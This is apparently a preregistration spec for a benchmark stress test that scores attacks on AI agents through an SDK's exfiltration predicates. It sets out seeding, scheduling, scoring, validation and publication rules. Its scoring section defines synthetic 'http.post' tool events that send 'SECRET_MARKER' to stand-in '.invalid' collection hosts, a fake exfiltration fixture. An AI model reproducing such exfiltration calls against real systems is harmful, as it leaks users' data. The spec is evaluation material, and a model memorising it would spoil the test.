purpose: One future post-freeze finite ORF-B conditional-regret stress test. This v7 artifact repairs the actual SDK score identity, makes all 3003 mixture schedules total, requires idempotent external publication recovery, and binds preserved public fixtures. It does not authorize or implement the held-out evaluation.

authorization.user_direction: ok, then lets fix these blockers properly. Remmebr to do the right thing not the easy thing

seed_domain_assumption.assumption: Conditional on the SHA-256 random-oracle heuristic, SHA256 of the 64 distinct preregistered calibration labels and SHA256(ASCII('orf-heldout-v7|master|') || a fresh 512-bit NIST output) are iid-equivalent uniform 256-bit masters. Seeding CPython random.Random with their big-endian integers then induces comparable profile-stream distributions.
seed_domain_assumption.input_distinction: Every calibration input is an ASCII label under orf-heldout-v6-calibration-v2; the future target input contains the domain-separated orf-heldout-v7 master prefix followed by raw fresh pulse bytes. No input is repeated.
seed_domain_assumption.selection_condition: The 64 labels and parameter support were fixed in preregistration commit 47f50a2 before the valid v2 outcomes. The invalid v1 computation and v2 repair used the same labels, predictions, and factor support. The inference additionally assumes no undisclosed label-prefix, parameter-support, or outcome search.
seed_domain_assumption.limitation: Forward unpredictability alone does not imply exchangeability. Rejecting the random-oracle, fresh-uniform-pulse, or selection conditions reduces the 64 masters to deterministic exploratory coverage and removes every target probability statement.
seed_domain_assumption.conditional_interval: Only under iid Bernoulli-equivalent masters, 64/64 clearing 5% gives the exact one-sided 95% Clopper-Pearson lower bound 0.95427029766923753936976169563270450199231817533648 because p_lower=0.05^(1/64).

numeric_execution.context: All Decimal operations use localcontext(prec=80,rounding=ROUND_HALF_EVEN,Emin=-999999,Emax=999999,capitals=1,clamp=0) with CPython 3.14.3 default traps.
numeric_execution.fraction_bridge: Convert each realized Decimal parameter separately to Fraction before any polynomial arithmetic. Cost is aF+bF*m+dF*m*m; negative cost is bF*m.
numeric_execution.cliff: r=Decimal(m)*(-lambda*Decimal(m-k)/Decimal(k)).exp(); e=clamp(floor(r),0,m); distance=min(r-floor(r),ceil(r)-r), all within the frozen context.
numeric_execution.certificate: If any distance is below 1E-60, publish PROTOCOL_INVALID/NUMERIC_STABILITY without regenerating.
numeric_execution.storage: Every parameter and resource is a reduced integer/positive-denominator fraction. Absent d is 0/1 and absent lambda is -1/1.
numeric_execution.percent: For reduced n/d, quantize Decimal(100)*Decimal(n)/Decimal(d) to 0.000000000001 in the frozen context and serialize exactly 12 fractional digits.

generator.primary_index: stratum=(((reset_index*2)+linear_index)*2+curvature_index)*5+cliff_index; profile=8*stratum+replicate. Listed level order is normative; replicate is 0..7.
generator.primary_draws: Fresh stream; draw a,b; draw d iff curvature HIGH; draw lambda iff cliff!=-1; no other draw or rejection. LogUniform ranges: a LOW[5,20], HIGH[40,80]; b LOW[0.1,1], HIGH[2,8]; d HIGH[0.05,0.2]; lambda[0.5,3].
generator.primary_events: e(m)=m if cliff=-1 or m<=cliff; otherwise use the certified cliff floor.
generator.negative: Profiles 0..63 use stream negative|profile={profile:02d}; draw only b=LogUniform[5,12], set a=d=0, lambda absent, cliff=-1; c(m)=bF*m and e(m)=m.
generator.weighting: Every primary profile has weight one. No weights override exists.

actual_sdk_score.candidate_id: candidate_id is bookkeeping only: SHA256(UTF8('orf-heldout-v7|split={split}|profile={profile:03d}|policy={policy}|phase={phase}|candidate={candidate:04d}|m={length:02d}')).hexdigest(), exactly 64 lowercase hex.
actual_sdk_score.trace_for_positive_event_count: For event ordinal j=0..e-1, append exactly {name:'http.post',side_effect:'SHARE',scope:'external',source:'user',ok:true,args:{url:'https://e{j:02d}.c{candidate_id[0:31]}.{candidate_id[31:64]}.invalid/collect',data:'SECRET_MARKER'},output:'ok'}; trace.user_messages is exactly ['send the synthetic marker'].
actual_sdk_score.predicate_path: predicates=comp/sdk/aicomp_sdk/core/predicates.py::eval_predicates(trace). Require exactly e predicates, each exactly EXFILTRATION severity 5 with evidence tool=http.post, and no other predicate.
actual_sdk_score.score_cell_path: score_cell_signature=comp/sdk/aicomp_sdk/core/cells.py::cell_signature(trace.tool_events) using all defaults and no injected mapping. score_cell_hash is score_cell_signature.hash, exactly 16 lowercase hex. candidate_id and score_cell_hash are distinct fields and are never equated.
actual_sdk_score.finding_path: The finding passed to comp/sdk/aicomp_sdk/scoring.py::score_attack_raw contains the actual trace, exact predicates, and actual score_cell_signature. get_score_cell_hash(finding) must return score_cell_hash.
actual_sdk_score.zero_case: If e=0, the attempted candidate produces no finding, retained=false, score_cell_hash=NA, predicate_count=0, sdk_candidate_raw=0.
actual_sdk_score.positive_case: If e>0, the candidate produces one finding, retained=true, predicate_count=e, and singleton score_attack_raw([finding]) must equal 16*e+2.
actual_sdk_score.trajectory_uniqueness: Within each complete (split,profile,policy) retained finding list, recompute all actual 16-hex score-cell hashes and require len(set(hashes))=len(findings). Any collision is PROTOCOL_INVALID/SCORE_CELL_COLLISION; it is never repaired, replaced by candidate_id, or ignored. Then recompute the trajectory score once with score_attack_raw(findings).
actual_sdk_score.objective: S=min(200000,SDK raw). The q=16e+2 shortcut is permitted only after the exact predicate, singleton-score, and trajectory-uniqueness assertions above pass.

score_and_single_length_policies.probe: Attempt one candidate in ascending length order. Generation charges every probe. Replay, returned count, and raw charge only e>0 probes.
score_and_single_length_policies.fill: Let common probe generation gF, retained count p, replay rF, and raw Q be exact. For q(m)>0, n=max(0,min(2000-p,floor((9000-gF)/cF(m)),floor((8100-rF)/cF(m)),0 if Q>=200000 else ceil((200000-Q)/q(m)))); S_z(m)=min(200000,Q+n*q(m)). For q=0, n=0 and S_z(m)=min(200000,Q).
score_and_single_length_policies.selection: ADAPTIVE chooses a length per profile. PROBE_GLOBAL_PRIMARY and PROBE_GLOBAL_NEGATIVE independently choose one aggregate-best length on their own split. Every length tie chooses the smaller length.
score_and_single_length_policies.static0: For q>0, n=min(2000,floor(9000/cF),floor(8100/cF),ceil(200000/q)); score=min(200000,n*q). For q=0 score is zero. Report all seven lengths, per-profile ORACLE0, and aggregate best with smaller-length ties.

mixture_scheduler.compositions: Enumerate every nonnegative seven-tuple h=(h_1,h_2,h_4,h_8,h_16,h_24,h_32) with sum h=8 in ascending Python tuple lexicographic order. There are exactly C(14,6)=3003.
mixture_scheduler.cycle_construction: For each h, initialize cycle-local count=[0,0,0,0,0,0,0]. For t=0,1,...,7, eligible indices are exactly i with count[i]<h[i]. Choose the eligible i maximizing the exact integer (t+1)*h[i]-8*count[i]; break ties by smaller lengths[i]. Append lengths[i] to cycle_h and increment count[i] by one. After t=7 require count==h. cycle_h is now an immutable eight-action tuple.
mixture_scheduler.execution_index: Initialize mixed_attempt_index j=0. The next intended action is exactly cycle_h[j mod 8]. The cycle therefore repeats from slot 0 after every eight emitted attempts; no mutable scheduler count survives a cycle boundary.
mixture_scheduler.precheck: For intended m, compute exact c,e,q without charging. If remaining_generation<c, STOP_GENERATION before an attempt, emit no row, charge nothing, and terminate this trajectory. If e>0 and remaining_candidates<1, STOP_CANDIDATE likewise. If e>0 and remaining_replay<c, STOP_REPLAY likewise. These stops are terminal and j does not advance.
mixture_scheduler.attempt: Otherwise emit exactly one MIXED candidate row with phase_ordinal=j and charge generation c. Increment j by one even when e=0. If e=0 retain nothing and continue at cycle_h[j mod 8]. If e>0 charge replay c, retain the actual SDK finding, decrement remaining candidates, and add its actual score subject to the trajectory-uniqueness assertion.
mixture_scheduler.saturation: If objective reaches 200000 after a positive retained attempt, STOP_SATURATION immediately. Emit no later candidate. Saturation cannot stop before retaining the crossing finding.
mixture_scheduler.selection: Aggregate every composition over the same 320 primary profiles. Select exactly the maximum aggregate; break aggregate ties by lexicographically smaller h.
mixture_scheduler.totality: Every state variable has an initial value and unique successor. Positive costs and the finite generation budget guarantee termination even for an all-zero-yield cycle.

valid_tsv_rule.principle: Final profiles.tsv, candidate_records.tsv, and mixtures.tsv contain only complete valid rows. Any generator, predicate, score, collision, policy, schema, row, or numeric error aborts evaluation and produces PROTOCOL_INVALID. Partial staging bytes never become final TSVs or metrics.
valid_tsv_rule.profiles_shape: Primary profiles 0..319 each in 18-policy order (5760 rows), followed by negative profiles 0..63 each in 3-policy order (192 rows), total 5952. Parameter fractions always equal their keyed realized profile values.
valid_tsv_rule.profile_fields: PRIMARY uses exact stratum/bands/cliff/replicate. NEGATIVE uses stratum=-1,bands=NA,cliff=-1,replicate=-1,a=0/1,d=0/1,lambda=-1/1. Non-MIX h fields are -1; MIX h fields are 0..8 summing to 8. Binding flags are set-valued: every capacity equal to fill_count is true; q=0 or policies without single-length capacities use binding_none=true.
valid_tsv_rule.candidate_types: attempted is literal true. candidate_id is 64 lowercase hex. score_cell_hash is actual 16 lowercase hex or NA. retained is lowercase true|false. Integers and reduced fractions are canonical.
valid_tsv_rule.candidate_order: Profile/policy key order then contiguous candidate_ordinal 0..attempted_count-1. phase_ordinal is contiguous within each key/phase. MIXED phase_ordinal equals mixed_attempt_index j. No row represents an unattempted action.
valid_tsv_rule.candidate_conditional: event_count=0 iff retained=false, score_cell_hash=NA, predicate_count=0, sdk_candidate_raw=0. event_count>0 iff retained=true, score_cell_hash equals the actual cell_signature hash (not candidate_id), predicate_count=event_count, and singleton sdk_candidate_raw=16*event_count+2.
valid_tsv_rule.mixtures_shape: Exactly 3003 ascending lexicographic rows. Each h field is 0..8 and sums to 8. selected is lowercase true|false with exactly one true under the frozen maximum/lexicographic rule.

metrics.aggregates: A=sum primary ADAPTIVE; G=sum selected PROBE_GLOBAL_PRIMARY; T=sum aggregate-best STATIC0; O=sum ORACLE0; M=selected mixture aggregate. G,T,O,M are positive.
metrics.primary: reduced (A-G)/G; conditional_regret=A-G. CONFIRMED/MATERIAL iff 100*(A-G)>=5*G. Every other valid result is DISCONFIRMED: ZERO iff A-G=0; POSITIVE_SUBTHRESHOLD iff 0<100*(A-G)<5*G. A-G<0 is protocol invalid.
metrics.profile_stratum: Per profile, regret is ADAPTIVE minus the selected global candidate. Count positive values and serialize count/320. For ordered strata 0..39, sum the eight adaptive/global values, regret, positive-profile count, and reduced regret/global; serialize positive-stratum count/40.
metrics.histogram: For each primary profile, sort seven candidate scores descending with duplicates; separation=first-second. Count ordered bins [0,1),[1,100),[100,1000),[1000,10000),[10000,100000),[100000,infinity); counts sum 320.
metrics.secondary: adaptive_over_static=(A-T)/T; adaptive_over_mixed8=(A-M)/M; signed_oracle0_gap=(A-O)/O; probe_generation_share=P/U, each as a reduced rational plus fixed-12 percent.
metrics.negative: Both homogeneous policies must select m=1 and have exact aggregate difference zero. Failure is protocol invalid; the invariant never becomes an empirical magnitude claim.

local_atomic_publication.filesystem_model: Before freeze, disposable tests must verify one POSIX filesystem/device for workspace and run directory, exclusive flock released on death, atomic same-directory link no-replace, atomic same-directory replace, file fsync, and directory fsync. Every mutation holds the fixed flock. Preflight failure forbids freeze.
local_atomic_publication.publish_noreplace: Construct canonical bytes and hash first. Use fixed same-directory .NAME.orf-stage. A matching final is complete; a mismatching final fails. A complete matching stage resumes; a partial/wrong stage with absent final is unlinked and directory-fsynced before recreation. Create stage O_CREAT|O_EXCL, write all bytes, fsync file, close, verify hash, link(stage,final) without replace, fsync directory, unlink stage, fsync directory.
local_atomic_publication.raw_exception: A complete schema/time-valid fetched raw stage may be published after recovery without another GET. A partial or invalid raw stage after a pre-GET marker makes the protocol invalid and is never refetched.
local_atomic_publication.replace_existing: First publish immutable after-image sidecars and WORKSPACE_TRANSACTION. Replace root results/progress from same-directory hard-link stages. Recovery accepts only destination hash=before (replace) or hash=after (already done); a third hash produces TERMINALIZATION_FAILED without changing scientific OUTCOME.

scientific_outcome.valid: OUTCOME VALID requires complete validated final TSVs/summary, exact decision fields, the frozen root-results before hash, and the deterministic resolved-ledger after hash.
scientific_outcome.invalid: OUTCOME PROTOCOL_INVALID requires no summary, last scientific state, exact reason, nullable artifact hashes, partial staging row counts, and NA/null/crash resolutions.
scientific_outcome.resolved_ledger: Before mutating root results.tsv, publish complete immutable RESOLVED_RESULTS.tsv derived from the implementation-commit results blob and OUTCOME. It is the authoritative prediction resolution.
scientific_outcome.local_terminal: Publish WORKSPACE_TRANSACTION, mirror root results/progress, and publish the terminal log idempotently. Exact after hashes yield COMPLETED. Any third destination hash yields TERMINALIZATION_FAILED. Scientific OUTCOME never changes.

external_terminal_publication.required_interface: Before freeze, bind one thread_id and preserve a capability artifact proving two server semantics: create(message,idempotency_key) is idempotent and returns the same immutable message_id for repeated same-key/same-payload calls while rejecting same-key/different-payload; list(thread_id,idempotency_key) is a linearizable read returning the immutable matching posts and their exact bytes. Documentation alone is insufficient unless it is an authenticated interface contract. If these semantics cannot be established without an unauthorized external test, freeze is forbidden.
external_terminal_publication.intent: Construct the exact one-line message containing POST_KEY and all payload hashes. Atomically publish TERMINAL_POST_INTENT.json before any external read or create. The intent is immutable and binds message bytes, message SHA256, thread, and key.
external_terminal_publication.recovery: Holding the workspace flock, load and validate the intent, then call list(thread_id,key) before every create. One exact match means success: atomically publish TERMINAL_PUBLICATION.json with its immutable message_id and observed exact hash. Zero matches permits create(message,key); regardless of response or crash, recovery returns to list-before-create. More than one match, a different payload under the key, or a capability mismatch publishes TERMINAL_PUBLICATION_FAILED.json and never creates again. A permanent authenticated rejection also publishes failure. No receipt is inferred solely from a create response.
external_terminal_publication.crash_argument: A crash before intent leaves no external call. A crash after intent but before create is recovered by the initial list. A crash or lost response after accepted create is recovered because the linearizable list returns the unique keyed message. A repeated create cannot duplicate it by the required server idempotency contract.
external_terminal_publication.claim: This closes duplicate-safe recovery conditional on the frozen external interface semantics. It still cannot cryptographically prevent an operator from suppressing both the post and local repository.

custody.freeze: Only after a future rigorous review and separately authorized implementation: from clean implementation commit after local/thread preflights, tests, and predictions, publish FREEZE_STARTED before the only anchor GET; preserve and validate raw; target=anchor+1440*60000; publish FREEZE and commit F.
custody.ack: Before target, post exact F/freeze hash/target in the bound thread, require exact ACK, preserve USER_ACK/PUBLICATION, and commit A parent F. Late or missing ACK invalidates.
custody.target: After target from clean A, publish TARGET_FETCH_STARTED before the only target GET. Marker forbids a second GET. Preserve exact response, require exact target time, derive master, publish OPENED then EVALUATION_STARTED; no profile stream exists earlier.
custody.evaluate: Evaluate both splits once into staging, validate every row/summary, and only then publish final artifacts. Any exception produces invalid OUTCOME. Scientific evaluation never resumes; only pure terminal recovery may resume.

rows_only_after_future_rigorous_review_a: finite conditional-regret prediction; calibration is conditional on explicit seed/selection assumptions

commands.rule: Null commands are deliberately absent, not TODO aliases. A later separately authorized implementation must add and review a source-hashed evaluator before any freeze.
